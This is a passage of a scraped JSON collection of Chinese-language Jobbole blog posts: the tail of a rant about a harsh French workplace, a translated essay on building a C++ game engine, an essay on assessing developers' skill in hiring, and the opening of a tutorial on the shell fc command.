software），根据自由软件基金会对其的定义，是一类可以不受限制地自由使用、复制、研究、修改和分发的，尊重用户自由的软件。这方面的不受限制正是自由软件最重要的本质，与自由软件相对的是专有软件（proprietary software），或被称为私有软件、封闭软件（其定义与是否收取费用无关──自由软件不一定是免费软件。,\n,整个团队，技术水平不如人意，了解互联网的人屈指可数，其中自认为了解互联网的，以为互联网只是为爱情动作片而生的。他们之间，如果有人说自己在网上看了点东西，听者就会露出会心一笑。,\n,地狱之旅,\n,本来在这里的工作，虽然不算优越，至少不会无聊。但是顶层的管理人员非要采用纳粹管理集中营的办法来管理员工。我随便举几个例子：,\n,\n,早九点后到岗是不允许的。有一天， 经理站在大门后，把 9 点整以后到的所有员工都当场炒鱿鱼，包括一些经理和销售人员。,\n,抽烟的员工，因为跑出去抽烟，工作的时间就打了折扣。所以管理层决定让所有员工都不许吸烟。当然，没有用。,\n,有时候，一连好几天咖啡机都被收起来。因为跑去喝咖啡的人自然没有坐在办公桌前的人、伏案写代码的人工作时间长。,\n,每次有上级来视察，咖啡机就要关掉，以便给上级留下大家都在桌前认真写代码的印象。,\n,那里的洗手间是我去过的洗手间里最恶心的。大概也是为了提高大家的效率：上厕所的时间少了，工作的时间自然就多了（工作质量自然也上去了）。,\n,\n,这样的工作，这样的管理，为什么大家还要来上班？最主要的原因就是当时法国深陷经济危机（某种程度上，现在也是），有工作，有薪水几乎成了特权，工作环境、内容自然就没那么在意了。,\n,还有一个原因，对于在那里的大多数员工而言，这份合约算是他们与一家真实公司签下的一份实实在在的合约。没有对比，就没有伤害，他们可能都不知道这份工作的糟心程度。很多员工新入职场，觉得迟到就被炒鱿鱼，也没什么不合理的。但是，这样严苛的标准，晚一分钟都不行，只有变态的管理者才会付诸现实。,\n,话又说回来，政府怎么会让这样的事情发生呢？但我们都心知肚明，政府里管这个项目预算的官员和软件公司的顶层管理人员拜过把子，关系够铁。在法国，这种程度的腐败也没什么新鲜的。很多人根本不知道，更别说有什么惩罚或者后果了。当然，也不限于法国，放眼欧美，这样的故事也不少。,\n,所以，下次上班觉得难熬，要学会置身处地。想像一下自己在那里工作，会是什么光景。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113920/", "url_object_id": "b51b2aa44b0b3a7401e270a76cf4f1bf", "front_image_path": "full/aab96c7405ff9c51c5ed53c3c56c2a4d05b37236.jpg"},{"front_image_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1fre7k2nnx5j20c806wgli.jpg"], "title": "如何编写 C++ 游戏引擎", "create_time": "2018/06/05", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,李大萌, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Jeff Preshing,。欢迎加入,翻译组,。,最近我在用 C++ 写游戏引擎，再用这个引擎做了一个移动端小游戏跳一跳（Hop Out）。下面是截自我的 iPhone6 的一个小片段。,\n,视频地址：http://preshing.com/images/hopoutclip.mp4,\n,跳一跳是我想玩的游戏类型：3D卡通外观的复古街机游戏。目标是改变每个填充块的颜色，就像Q * Bert一样。,\n,Hop Out仍在开发中，但引擎的功能已经很完善了，所以我想在这里分享一些关于引擎开发的技巧。,\n,你为什么想要写一个游戏引擎？可能有很多原因：,\n,你是个修理工，喜欢从头开始建立系统，直到系统完成。,\n,关于游戏开发你想了解更多。我在游戏行业工作了14年，现在我仍然在不停的琢磨。我甚至不确定我是否可以从头开始编写一个引擎，因为它与大型工作室的编程工作的日常职责大不相同。我想知道答案。,\n,你喜欢控制。对完全按照你想要的方式组织代码，知道一切都在哪里，感到满意。,\n,你可以从,AGI,（1984），,id Tech 1,（1993），,Build,（1995）等经典游戏引擎以及Unity和Unreal等行业巨头那里获得灵感。,\n,你相信我们这个游戏产业应该试着去揭开引擎发展的序幕。我们并没有掌握制作游戏的艺术。还离得很远！我们对这个过程的研究越多，改进的机会就越大。,\n,2017年的游戏平台 – 手机，游戏机和电脑 – 非常强大，而且在很多方面都非常相似。游戏引擎的开发并不是像过去一样，在脆弱和怪异的硬件上挣扎。在我看来，更多是关于自己制造出来的复杂性的斗争。创造一个怪物很容易！这就是为什么本文建议围绕着保持事情可控的原因。我把它分成三部分：,\n,\n,使用迭代方法,\n,在统一事物前要三思,\n,请注意，序列化是一个很大的课题,\n,\n,这个建议适用于任何类型的游戏引擎。我不会告诉你如何编写着色器，八叉树是什么，或者如何添加物体。这些事儿，都是我假设你已经知道而且应该知道 – 这很大程度上取决于你想要制作的游戏类型。相反，我故意选择了一些似乎没有被广泛承认或提及的观点 – 这些是我在试图揭开一个主题神秘面纱时最感兴趣的一些观点。,\n,\n,使用迭代方法,\n,我的第一条建议是使一些东西（任何东西），快速运行起来，然后迭代。,\n,如果可能的话，从一个示例应用程序开始，初始化设备并在屏幕上绘制一些东西。就我而言，我下载了,SDL,，打开了Xcode-iOS / Test / TestiPhoneOS.xcodeproj，然后在我的iPhone上运行了testgles2示例。,\n,\n,瞧！我使用OpenGL ES 2.0，生成了一个可爱的旋转立方体。,\n,下一步，是下载一个其他人制作的马里奥3D 模型。我写了一个快速和粗糙的OBJ文件加载器 – 文件格式并不太复杂 – 并且修改了例程，来呈现Mario，而不是一个立方体。我还集成了,SDL_Image,来帮助加载纹理。,\n,\n,然后我实现了一个双摇杆控制器用来操控马里奥（我本来想要创建的是一个双摇杆设计游戏，并不是马里奥。）,\n,\n,接下来，我想探索骨骼动画，所以我打开了,Blender,，做了一个触手模型，并且用一个前后摆动的双骨架来操纵它。,\n,\n,此时，我放弃了OBJ文件格式，编写了一个Python脚本来从Blender导出自定义的JSON文件。这些JSON文件描述了皮肤网格，骨架和动画数据。在,C ++ JSON库,的帮助下将这些文件加载到游戏中。,\n,\n,一旦这个完成，我回到了Blender，并做了更详细的角色设计。 （这是我创造的第一个被操纵的3D人，我为他感到骄傲。）,\n,\n,在接下来的几个月里，我采取了以下几个步骤：,\n,\n,开始将向量和矩阵函数分解成我自己的3D数学库。,\n,用CMake项目替换.xcodeproj。,\n,在Windows和iOS上运行引擎，因为我喜欢在Visual Studio下工作。,\n,开始将代码移动到单独的“引擎”和“游戏”库中。随着时间的推移，我把它们分成更细粒度的库。,\n,写了一个单独的应用程序将我的JSON文件转换为游戏可以直接加载的二进制数据。,\n,最终从iOS版本中删除所有SDL库。 （Windows版本仍然使用SDL。）,\n,\n,重点是：在开始编程之前，我没有对引擎架构进行设计。这是一个经过深思熟虑的选择。相反，我只是写了实现下一个特性的最简单的代码，然后我会查看代码，看看会出现什么自然生成的架构。我说的“引擎架构”是指组成游戏引擎的模块集，这些模块之间的依赖关系，以及用于与每个模块交互的 ,API,。,\n,\n,这是一个,迭代,的方法，因为它关注于较小的可交付成果。它在编写游戏引擎时效果非常好，因为在每个步骤中，你都有一个正在运行的程序。如果在将代码合成到新模块中时出现问题，可以随时将做的更改与以前工作的代码进行比较。显然，我假设你在使用,某种源代码管理工具,。,\n,你可能会认为这种方法浪费了很多时间，因为总是在编写糟糕的代码，之后需要清理。但是大部分的清理操作都是将代码从一个.cpp文件移动到另一个，将函数声明提取到.h文件中，或者直接进行简单的修改。决定事情应该去哪是难点，但是这在已经有代码的时候会更容易决定。,\n,我认为用相反的方法：试图设计出一个能够提前完成所有需求的架构，会浪费更多的时间。我最喜欢的两篇关于系统过度设计风险的文章是 ,Tomasz Dąbrowski 的《泛化的恶性循环》,和 ,Joel Spolsky 的《不要让架构太空人吓到你》,。,\n,我并不是说在用代码处理问题之前，不应该在纸上进行设计。我也不是说你不应该事先决定你想要的功能。比如，我从一开始就知道我想让我的引擎在后台线程中加载所有资源。我只是没有尝试设计或实现该功能，直到我的引擎首先加载一些资源。,\n,迭代的方法给了我一个比我以前盯着一张白纸冥思苦想更优雅的架构。我的引擎的iOS版本现在是 100％ 原始代码，包括自定义数学库，容器模板，反射/序列化系统，渲染框架，物理模块和音频混合器。我可以编写每一个模块，但是你可能没有必要自己写所有这些东西。你可能会发现适合自己引擎的许多优秀的开源代码库。 ,GLM,、,Bullet Physics, 和 ,STB 头文件,只是一些有趣的例子。,\n,在整合事物太多之前要三思,\n,作为程序员，我们尽量避免代码重复，喜欢代码遵循统一的风格。不过，我认为不要让这些本能凌驾于每一个决定之上。,\n,偶尔要抵制一下 DRY 原则,\n,举个例子，我的引擎包含了几个“智能指针”模板类，与 std :: shared_ptr 类似。每一个指针作为一个原始指针的包装，有助于防止内存泄漏。,\n,\n,<> 是用于具有单个所有者的动态分配的对象。,\n,Reference<> 使用引用计数来允许一个对象拥有多个所有者。,\n,audio :: AppOwned <> 被音频混音器以外的代码调用，允许游戏系统拥有音频混音器使用的对象，例如当前播放的语音。,\n,audio :: AudioHandle <> 使用音频混音器内部的引用计数系统。,\n,\n,这样可能看起来像其中一些类复制了其它的功能，违反 ,DRY（不要重复自己）,的原则。事实上，在开发早期，我尽可能地重用现有的Reference <>类。但是，我发现音频对象的生命周期是由特殊规则来管理的：如果一个音频语音已经完成了一个样本的播放，并且游戏没有指向该语音的指针，那么该语音会被立即到删除排队等待。如果游戏持有指针，则不应删除这个语音对象。如果游戏持有一个指针，但指针的所有者在语音结束之前被销毁，这段语音应该被取消，而不是增加Reference <>的复杂性，我决定引入单独的模板类，这样更为实用。,\n,95％ 的时间都在重用现有的代码。但是，如果你开始感到麻痹，或者发现自己增加了一件简单的事情的复杂性，那就问自己，代码库中的东西是否应该是两件事。,\n,可以使用不同的调用规则,\n,我不喜欢Java的一件事是，它强迫你在一个类中定义每个函数。在我看来，这是无稽之谈。这可能会使你的代码看起来更加一致，但是它也鼓励过度工程，并且不适合我前面描述的迭代方法。,\n,在我的 C++ 引擎中，一些函数属于类，有些则不属于类。例如，游戏中的每个敌人都是一个类，可能就像你预料的那样，大部分敌人的行为都是在这个类内部实现的。另一方面，在我的引擎中投射的球体是通过调用 ,sphereCast(,) 函数来执行的，这是物理命名空间中的一个函数。 sphereCast() 不属于任何类 – 它只是物理模块的一部分。我构建了一个系统来管理模块之间的依赖关系，这使得我的代码组织得很好。将这个函数包装在一个任意的类中不会以任何有意义的方式改善代码的组织。,\n,然后是,动态调度,，这是一种,多态的形式,。我们经常需要为一个对象调用一个函数，而不知道该对象的确切类型。 C ++程序员的第一本能是用虚函数定义抽象基类，然后在派生类中重写这些函数。这是有效的，但这只是一种技术。还有其他动态调度技术，不会引入额外的代码，或带来其他好处：,\n, ,\n,\n,C ++ 11引入了std :: function，这是存储回调函数的一个简便方法。也可以编写自己的std :: function版本，这样在调试中不会那么痛苦。,\n,许多回调函数可以用一对指针来实现：一个函数指针和一个类型不确定的参数。它只需要在回调函数中进行明确的转换。你在纯C语言库中经常看到。,\n,有时候，底层类型实际上是在编译时已知的，你可以绑定这个函数调用而不用额外的运行开销。 ,Turf,是我在游戏引擎中使用的一个库，它非常依赖这种技术。例如看到turf:: Mutex,这只是针对特定平台类的定义。,\n,有时，最直接的方法是自己构建和维护一个原始函数指针表。我在我的音频混音器和序列化系统中使用了这种方法。Python解释器也大量使用这种技术，如下所述。,\n,你甚至可以将函数指针存储在散列表中，使用函数名称作为关键字。我使用这种技术来调度输入事件，如多点触控事件。这是记录游戏输入并用重放系统回放的策略的一部分。,\n,\n,动态调度是一个很大的课题。我只是想表明，有很多方法来实现它。你编写的可扩展底层代码越多（这在游戏引擎中很常见），越会发现替代方法越多。如果你不习惯这种编程，C语言编写的Python解释器是一个很好的学习资源。它实现了一个强大的对象模型：每个PyObject都指向一个PyTypeObject，每个PyTypeObject都包含一个用于动态分配的函数指针表。如果你想直接跳转到其中的话，,定义新类型,的文档是一个很好的起点。,\n,注意序列化是一个大问题,\n,序列化,是将运行时对象转换为字节序列的操作。换句话说，就是保存和加载数据。,\n,对于许多游戏引擎来说，游戏内容以各种可编辑的格式创建，例如.png，.json，.blend或专有格式，然后最终转换为特定于平台的可以快速加载到引擎的游戏格式。流水线中的最后一个应用通常被称为“炊具”。炊具可能被集成到另一个工具，甚至分布在几台机器上。通常，炊具和一些工具是与游戏引擎本身一起开发和维护的。,\n,\n,在建立这样的流水线时，每个阶段的文件格式的选择取决于你。你可以定义自己的一些文件格式，这些格式可能会随着添加引擎功能而变化。渐渐地可能会发现有必要保持某些程序与以前保存的文件兼容。不管什么格式，你最终都需要用C++来序列化它。,\n,用C ++实现序列化有无数种方法。一个相当明显的方式是将加载和保存函数添加到要序列化的C ++类。可以通过在文件头中存储版本号来实现向后兼容，然后将这个数字传递给每个加载函数。这是可行的，尽管这样代码可能维护起来比较繁琐。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n    void load(InStream& in, u32 fileVersion) {\r\n        // 加载预期的成员变量\r\n        in >> m_position;\r\n        in >> m_direction;\r\n\r\n        // 仅当正在加载的文件版本是2或更大时才加载新的变量\r\n        if (fileVersion >= 2) {\r\n            in >> m_velocity;\r\n        }\r\n    },\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,    ,void, ,load,(,InStream,&, ,in,,, ,u32 ,fileVersion,), ,{,        ,// 加载预期的成员变量,        ,in, ,>>, ,m_position,;,        ,in, ,>>, ,m_direction,;, ,        ,// 仅当正在加载的文件版本是2或更大时才加载新的变量,        ,if, ,(,fileVersion, ,>=, ,2,), ,{,            ,in, ,>>, ,m_velocity,;,        ,},    ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,通过,反射,（特别是通过创建描述C ++类型布局的运行时数据），可以编写更灵活，不容易出错的序列化代码。想要快速了解反射如何进行序列化，请看一下开源项目,Blender,是如何实现的。,\n,\n, ,\n,从源代码构建Blender时，有许多步骤。首先，编译并运行一个名为makesdna的自定义实用程序。该实用程序解析Blender源代码树中的一组C语言头文件，然后以,SDNA,的自定义格式输出所有C定义类型的汇总。这个SDNA数据作为反射数据，链接到Blender本身，并保存在Blender写入的每个.blend文件中。从这一刻开始，每当Blender加载一个.blend文件，就会将.blend文件的SDNA与链接到当前版本的SDNA进行比较，并使用通用序列化代码来处理差异。这个策略使Blender具有令人印象深刻的向前和向后兼容性。你仍然可以在最新版本的Blender中加载,1.0版本,的文件，也可以在旧版本中加载新的.blend文件。,\n,像Blender一样，许多游戏引擎及其相关工具都会生成并使用自己的反射数据。有很多方法可以做到这一点：可以像Blender一样解析自己的C / C ++源代码来提取类型信息。你可以创建一个单独的数据描述语言，并编写一个工具来从该语言生成C ++类型定义和反射数据。可以使用预处理器宏和C ++模板在运行时生成反射数据。一旦你有反射数据可用，有无数的方法来编写一个通用的序列化器。,\n,显然，我省略了很多细节。在这篇文章中，我只想表明有很多不同的方法来序列化数据，其中一些非常复杂。程序员不会像其他引擎系统那样讨论序列化，尽管大多数其他系统依赖于它。例如，在,GDC 2017,给出的96个程序设计讲座中，我数了一下，共有31次关于图形，11次关于在线，10次关于工具，4次关于AI，3关于物理模块，2关于音频的 – 但只有一个,直接涉及到序列化,。,\n,至少，试着想一想你的需求会有多复杂。如果你正在制作一个像Flappy Bird这样的小游戏，只有少数资源.，那么你可能不需要想太多的序列化。你可以直接从PNG加载纹理，这样很好处理。如果你需要一个向后兼容的紧凑的二进制格式，但不想自己开发，可以看看第三方库，比如,Cereal,或者,Boost.Serialization,。我不认为,Google协议缓冲区,是序列化游戏资产的理想选择，但是值得研究。,\n,编写一个游戏引擎，即使是一个小游戏引擎，也是一个很大的任务。关于这个我可以说的还有很多，但是对于这个长度的帖子来说，这真的是我认为最有用的建议：迭代地工作，抵制统一代码的冲动，并且知道序列化是一个大问题，你需要选择一个合适的策略。根据我的经验，如果忽视这些事情，每一件事情都可能成为一个绊脚石。,\n,我喜欢比较这些东西，真的很想听到其他开发人员的意见。如果你已经写了一个引擎，你的经验是否让你有什么相同的结论吗？如果你没有写，或者只是在构思，我也对你的想法也很感兴趣。你认为什么是好的学习资源？哪些部分对你来说看起来很神秘？你可以在下面评论或在,Twitter,上给我留言！,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,李大萌,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            码农一枚        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 25, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113960/", "url_object_id": "249c4ace42a38cef57cda8a8fa492236", "front_image_path": "full/50bda070535be329674b77c46cecd71fae0e4cad.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/e268c18430b4378f4b65054379484b31.png"], "title": "如何识别人的技术能力和水平？", "create_time": "2018/04/25", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,ACE开发者,   ,\n,这个题目是比较复杂的，它包含的东西比较多，认真讨论估计能写几万字。如果是专业研究，我看能写一本书了。这里打算根据自己的学习过程和工作经验，谈一下要点问题，均属个人看法，欢迎讨论。,\n,\n,写这篇文章的初衷，跟前段时间跟朋友们聊招聘有关。因为技术招聘除了考察人的协作精神和工作态度，一大目标便是判断人的技术能力和实际水平。在这件事情上多做观察、思考是很有意义的。,\n,对于考察人的技术等级，学界是有认真的研究的。参见：,德雷福斯模型解说,。,\n,德雷福斯模型把人的技能水平，分成5级：,新手、高级新手、胜任者、精通者、专家。,\n,对不同技能等级的认定是这样的：,\n,\n,新手：依靠指令清单，必须按部就班。,就是必须给出详细而具体的操作规则，才能工作。比如你做一道从未做过的菜，需要看菜谱的说明，第一步做什么，第二步做什么等等，直到最后烹饪结束。,\n,高级新手：有限的情景洞察力，同等对待工作的各个方面。对全局性、体系性的东西没兴趣。,这是小工的水平。比如他能跟着师傅干点活，打打下手。可以靠着反复检索搜索引擎、StackOverflow解决具体的小问题。,\n,胜任者：能够独立解决各种各样的领域内问题。,这是一般的企业招聘，比较希望招到的等级，招进来稍作适应就能干活了，省心省力。,\n,精通者：经验丰富，可以自我纠正、自我改进。,这类等级的人，思考可以指向内在，通过反省、反馈改善技能。这种在企业可以算上高手、大拿了，培养不易。,\n,专家：依靠直觉工作，不需要解释和理由。,实际你让他解释，他可能也说不出个所以然，就是直觉给出答案，然后还是对的。专家人数稀少，需要很长时间训练、实践。通常的说法是10年出专家，10000小时定律。,\n,\n,这个是理论上的研究，实践中比较缺乏操作性，难以迅速的判定应聘者的实际情况。不信你打开收进来的大把简历，刚毕业的学生，每个技能名词上面都是一堆堆的“,精通,” – 你相信么？但它可以当成一个职业技能等级判定的参照标准。,\n,于是乎，各家企业开启了各种“笔试”、“机试”，多轮面试，并且严格要求学历以及出身院校，试图以此过滤掉不合意的应征者，留下合格的人选。,它当然是可行的，但是效果一般，而且容易出错，错失有思想有水平的人。,不然也不会催生出各类“推荐式”的招聘。看重学历、学校当然也有其优点：它是快速过滤的手段，毕竟能考上好学校的人智商不会太差吧。但在大数字公司的一朋友说，公司里面还有初中毕业，一直精研安全领域的人，技术能力也是十分出色。如果严苛对待背景，这些人就会错过了。因为人的生活多种多样，有各种历史的背景因素影响经历。而部分人的经历，就是跟一些人不同的，可是不妨碍他们同样可以变得优秀。招聘，实际上是建立信任关系。如果有充足的信息证明，应聘者足够优秀，这就够了。条条框框只是辅助手段，并不是目的。,\n,\n,任正非的洞察力一流,\n,推荐式的招聘实际要靠谱的多，因为人很容易了解熟悉的人的水平。,这是靠推荐者的信用背书。,人平时沟通时说什么话，日常看什么书，关注哪些领域，琢磨过啥问题，哪些东西很熟，这个经常聊的熟人往往都知道。可是，这类招聘局限性也很大：,面窄、靠机缘,。靠推荐能招几个好手啊？好手往往是各家争抢的对象，窗口期有限，基本不会缺工作的。,\n,说了一圈，还是要在技能水准判定上有更高效率的办法，招进合适的人来。,\n,回到开头的德雷福斯模型，既然人的技能是分级的，那么,对待不同的职位要求，也应该侧重不同的考察角度。,如果千篇一律的走招聘流程，就容易出问题了。比如你明明要找的是“,精通者,”，可上来就让人一堆笔试、机试，这是不合适的。对方会十分的厌烦。体现高水平技术能力的并不在默写什么“字符串算法”那里。这反倒是刚毕业的人占便宜，因为才学过不久，印象深。不信你让工作10年的人跟计算机专业应届生比比写排序算法，真未必能赢。但是这并不重要 – 你干活不看手册不查文档吗？聪明人从不死记硬背。,重要的地方在于对问题域的准确、深刻的理解，对各类技术优劣点、各种条件平衡的评判和把握。,\n,对待初阶新人，,应着重考察的是基本功是否扎实，专业成绩是否优秀。更重要的，是他对职业的热情，学习能力和研究精神。,某类人要说起技术来，滔滔不绝，两眼放光，充满热情，对未知的、新生的各类概念、技术非常好奇，这种人想差都难。因为他会自我驱动，不用督促，自己就钻研前进。反之，觉得这个职业待遇高，只是想混饭吃的人，很少走得长远。这类初阶新人以毕业生、工作年限少者为多。测试考核，可以笔试查看其对基础概念的理解是否准确，知识领域的大致范围。甚至，布置一个有点挑战性的小任务，让他尝试解决，说明思路。,\n,考察胜任、精通者的策略不一样,。笔试做题没啥用，原因前面说了。这类招聘是重头戏，企业都喜欢找这样的，能干活。所以考核评估的地方也较多。我觉得可以分成几个方面去看。,意识是否先进，是否会反省思考；是否善于解决问题，富有创造性；是否有比较深的积累和广阔的知识面。,\n,业界的开发思想也是在不断变化，工具链一直在革新。聪明的人不用蛮力，而爱用工具提升效率，喜欢自动化操作解放人力。,要查看人用什么开发工具链，用什么开发环境，解释下为什么？,好的开发者会及时注意新出现的工具，挖掘它能解决什么问题，并尝试吸收，解决自己的需求。如果没有这个思想意识，工作效率就会打折扣了。因为你会落后行业发展水平。人善于自我反省，则会催动自我纠正，这正是精通者的特征。参考：,优秀的开发者为什么要学习研究新的编程语言？,\n,解决问题的能力是重头戏，也是企业招聘人的主因。人要善于解决实际问题，而且，要学会聪明的解决问题。解决问题要看思路，看手段，看是否有创造性，这是真正考验人能力的地方。好的开发者，会考虑很多可能选项，预估各种优劣，给出一个较优的方案。 遇到难题，会用各种方法尝试。经验丰富的人，常常会使用技术的组合手段来处理难题，而不是一个语言一个工具到处用。所以，,要查看下过往的项目经历遇到的问题、困难，是如何解决的，思路如何。,一些公司据说不招聘不会用谷歌的工程师。谷歌打不开？嘿嘿，这就是你要克服的困难啊。这你都解决不了，还做什么研发。谷歌是人类最全、最新知识的总索引，充分利用事半功倍。,\n,考察知识的深度、广度，对重要领域的概念是否有深刻的理解和掌握，以及从各类工作经验中得到的认知。,问问他看过什么书，研究过什么东西。说白了，知道的东西是否多。一些公司很喜欢用CheckList模式来考核，列一堆领域的知识点、概念，问人懂不懂，知道就是水平好，不懂就是水平差。实际情况并非如此。人的工作过程是独立的，一些事情如果没有工作机会去接触并解决，那么一些冷僻的问题就永远都碰不上。当然也就不知道。但你能说没做过就一定做不好么？,\n,另外，人的技能树，其实也是“犬牙交错、参差不齐”的。什么意思？技术领域非常的广阔，你真的没办法每个领域都很精通，实际上是这个做的多，懂的多，那个用的少，知道的少。这个时候，应看具体知识领域，是哪一类。它是否需要复杂的、难度较高的背景。门槛高的技术，需要的配套技能多得多，比如,AI、机器学习,。而一般产品应用领域则不然，了解核心概念、设计意图，看着手册、最佳实践，也就能上手了。这个暂时不会，实际无关紧要的，工作一段学的认真点就会了。但是门槛高的领域，就需要很长时间的学习了。这是本质的差别。,\n,我曾看见某公司放出的职员技能树，包罗万象，几乎一切IT领域的知识技能都在里面了，还声称要求“全部精通”。我不知道它如何定义的“精通”，如果按德雷福斯模型的定义，能做到的那是神，不是人类。这个纯属吹牛皮，我压根就不信。如果真有这样的人，出来让我膜拜下。因为每个稍大点的领域，都足够让你钻研一辈子，因为它们也在迅速发展呀。业内流传“,全栈工程师,”的说法，鼓吹自己是全栈的人经常是前端工程师。而研究后端工作领域的技术高手经常鄙视这类人：真以为会点Node.js就能解决一堆后端的事务了么？我也懂一些前端，也能号称“全栈”，但在不同领域的专业性是什么水准，自己明白的很。前端要解决的事情也有很多复杂性。全栈实际是反专业化的，是人力资源稀缺时候的低成本选择。,\n,更高一层，则是考察人本身了。人的视野够广阔么？其它领域的知识有了解吗？一些问题的解答并不在问题域本身，而是在外面的领域。所谓“,功夫在诗外,”。公司讲求团队协作，总要面临不同的分工合作问题。比如产品、运营的人提需求，可以换位思考吗？合作意识强么？谁也不想招个刺头进来吧？把团队的气氛和人际关系搞的一团糟，大家做事都不痛快、不顺心，又如何安心做好工作？最终只能让团队工作效率下降，甚至瓦解。,\n,要说专家，实际上有研究者认为是需要刻意练习+充分实践才能功成。并不是每个人经过足够的工作年限，都自动成为专家。有的人工作10年，可能后面9年都在重复第一年的工作任务，毫无改进。而职业上的训练机会，又跟大环境乃至运气息息相关，并不是每个人都有机缘的。但是把个人的职业技能做到胜任乃至精通，则是完全可行的，这只需要认真和勤奋，工作态度问题。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113923/", "url_object_id": "cc046f39bd58bd3436d2a6869083d93a", "front_image_path": "full/a6bd0b86424540078e7288d939384886be448281.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/9d9a2ae51099793ebcb0c2af97dc331b.png"], "title": "给初学者的 fc 示例教程", "create_time": "2018/04/25", "vote": "1", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SK,   译文出处：,Linux中国/Dotcra,   ,\n,fc, （,F,ix ,C,ommands 的缩写）是个 shell 内置命令，用于在交互式 shell 里列出、编辑和执行最近输入的命令。你可以用你喜欢的编辑器编辑最近的命令并再次执行，而不用把它们整个重新输入一遍。除了可以避免重复输入又长又复杂的命令，它对修正拼写错误来说也很有用。因为是 shell 内置命令，大多 shell 都包含它，比如 Bash 、 Zsh 、 Ksh 等。在这篇短文中，我们来学一学在 Linux 中使用 ,fc, 命令。,\n,fc 命令教程及示例,\n,列出最近执行的命令,\n,执行不带其它参数的 ,fc -l, 命令，它会列出最近 16 个命令。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l\r\n507 fish\r\n508 fc -l\r\n509 sudo netctl restart wlp9s0sktab\r\n510 ls -l\r\n511 pwd\r\n512 uname -r\r\n513 uname -a\r\n514 touch ostechnix.txt\r\n515 vi ostechnix.txt\r\n516 echo \"Welcome to OSTechNix\"\r\n517 sudo apcman -Syu\r\n518 sudo pacman -Syu\r\n519 more ostechnix.txt\r\n520 wc -l ostechnix.txt\r\n521 cat ostechnix.txt\r\n522 clear\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l,507, ,fish,508, ,fc, ,-,l,509, ,sudo ,netctl ,restart ,wlp9s0sktab,510, ,ls, ,-,l,511, ,pwd,512, ,uname, ,-,r,513, ,uname, ,-,a,514, ,touch ,ostechnix,.,txt,515, ,vi ,ostechnix,.,txt,516, ,echo, ,\"Welcome to OSTechNix\",517, ,sudo ,apcman, ,-,Syu,518, ,sudo ,pacman, ,-,Syu,519, ,more ,ostechnix,.,txt,520, ,wc, ,-,l, ,ostechnix,.,txt,521, ,cat ,ostechnix,.,txt,522, ,clear, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,-r, 选项用于将输出反向排序。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -lr\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,lr, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,-n, 选项用于隐藏行号。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -ln\r\n nano ~/.profile\r\n source ~/.profile\r\n source ~/.profile\r\n fc -ln\r\n fc -l\r\n sudo netctl restart wlp9s0sktab\r\n ls -l\r\n pwd\r\n uname -r\r\n uname -a\r\n echo \"Welcome to OSTechNix\"\r\n sudo apcman -Syu\r\n cat ostechnix.txt\r\n wc -l ostechnix.txt\r\n more ostechnix.txt\r\n 